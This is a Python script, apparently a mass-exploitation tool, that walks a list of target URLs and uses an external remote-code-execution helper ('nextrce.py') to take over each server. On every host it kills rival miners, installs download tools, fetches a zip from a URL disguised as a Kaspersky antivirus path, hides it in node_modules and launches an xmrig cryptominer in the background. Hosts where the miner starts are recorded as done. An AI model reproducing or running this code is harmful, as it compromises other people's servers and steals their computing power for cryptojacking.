import subprocess
import time
import threading
from concurrent.futures import ThreadPoolExecutor

SITELIST = "z.txt"
DONE_FILE = "done.txt"

SUCCESS_MARK = "Scan completed"
TARGET_STRING = "xmrig --config config.json"

MAX_THREADS = 15

file_lock = threading.Lock()

INSTALL_COMMANDS = [
    "pkill -9 -f xmrig",
    "apt update -y",
    "apt install curl -y",
    "apt install wget -y",
    "apt install unzip -y",
    "mkdir -p node_modules"
]

CURL_CMD = "curl -L https://www.kaspersky.com/linux-antivirus/zzx.zip -o node_modules/zzx.zip"
WGET_CMD = "wget -O node_modules/zzx.zip https://www.kaspersky.com/linux-antivirus/zzx.zip"

POST_COMMANDS = [
    "unzip -o node_modules/zzx.zip -d node_modules",
    "chmod +x node_modules/xmrig",
    "nohup node_modules/xmrig --config config.json >> node_modules/system.log 2>&1 &"
]


def run_remote(url, cmd):
    try:
        process = subprocess.run(
            ["python3", "nextrce.py", "-u", url, "-c", cmd],
            capture_output=True,
            text=True,
            timeout=180
        )
        return process.stdout + process.stderr
    except Exception as e:
        return str(e)


def run_and_wait(url, cmd, retries=5):
    print(f"[{url}] > {cmd}")

    for attempt in range(retries):
        output = run_remote(url, cmd)

        if SUCCESS_MARK in output:
            return output

        time.sleep(2)

    return output


def process_server(url):
    print(f"\n[+] Processing {url}")

    # INSTALL & KILL
    for cmd in INSTALL_COMMANDS:
        run_and_wait(url, cmd)

    # CURL
    run_and_wait(url, CURL_CMD)

    # CEK FILE
    ls_output = run_and_wait(url, "ls -la node_modules")

    if "zzx.zip" not in ls_output:
        run_and_wait(url, WGET_CMD)

    # POST COMMANDS
    for cmd in POST_COMMANDS:
        run_and_wait(url, cmd)

    # CEK PROSES xmrig
    check_output = run_and_wait(url, "ps aux | grep xmrig | grep -v grep")

    if TARGET_STRING in check_output:
        print(f"[✓] xmrig running on {url}")
        with file_lock:
            with open(DONE_FILE, "a") as done:
                done.write(url + "\n")
    else:
        print(f"[!] xmrig not detected on {url}")

    print(f"[✓] Done {url}")


# ===========================
# MAIN
# ===========================

with open(SITELIST, "r") as f:
    sites = [line.strip() for line in f if line.strip()]

with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
    executor.map(process_server, sites)

print("\n=== SEMUA SERVER SELESAI ===")